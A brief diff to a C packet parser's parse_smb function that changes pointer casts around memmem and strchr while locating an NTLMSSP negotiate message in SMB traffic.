@@ -127,10 +127,10 @@ static void parse_smb(struct packet_object *po)
     * Let's check if it's NTLMSSP_NEGOTIATE
     */
     ptr += ( (*ptr) * 2 + 3 );
-    if ( (ptr = (char *)memmem(ptr, 128, "NTLMSSP", 8)) == NULL) 
+    if ( (ptr = memmem(ptr, 128, "NTLMSSP", 8)) == NULL) 
        return;
        
-    ptr = strchr(ptr, 0);
+    ptr = (u_char*)strchr((char*)ptr, 0);
     ptr++;
 
     /* NTLMSSP_NEGOTIATE */	  
